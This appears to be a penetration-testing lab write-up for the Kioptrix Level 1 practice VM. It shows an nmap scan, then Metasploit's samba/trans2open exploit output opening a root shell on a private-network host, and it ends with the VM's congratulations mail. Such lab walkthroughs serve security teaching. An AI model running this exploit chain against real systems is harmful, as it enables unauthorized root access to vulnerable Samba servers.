*This tasks was realised in pair, I was responsible for finding vulnerabilities and exploiting them in order to obtain evidence of successful attack.*

# Kioptrix 1
Firstly we scan host with `nmap`:
```
nmap -sT 192.168.56.105
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-28 10:44 EST  
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers                                                                                        
Nmap scan report for 192.168.56.105                                                                                      
Host is up (0.0087s latency).               
Not shown: 994 closed ports
PORT      STATE SERVICE        
22/tcp    open  ssh            
80/tcp    open  http        
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
443/tcp   open  https
32768/tcp open  filenet-tms

Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
```
Scan reveals `netbios-ssn` on port 139. We suspect using vulnerable technology `Samba`. We are beginning exploitation with `samba/trans2open` from `metasploit`:
```
[*] 192.168.56.105:139 - Trying return address 0xbffffdfc...
[*] Started bind TCP handler against 192.168.56.105:4444
[*] 192.168.56.105:139 - Trying return address 0xbffffcfc...
[*] 192.168.56.105:139 - Trying return address 0xbffffbfc...
[*] 192.168.56.105:139 - Trying return address 0xbffffafc...
[*] Command shell session 5 opened (0.0.0.0:0 -> 192.168.56.105:4444) at 2020-12-28 11:32:51 -0500
```
Uzyskany dostęp wykorzystujemy do znalezienia dowodu ukończenia zadania. Dane hosta:
We use shell access to find evidence of level completion.
```
uname -a
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
id
uid=0(root) gid=0(root) groups=99(nobody)
```
In `/var/mail/root` we found following message:
```
If you are reading this, you got root. Congratulations.
Level 2 won't be as easy...
```
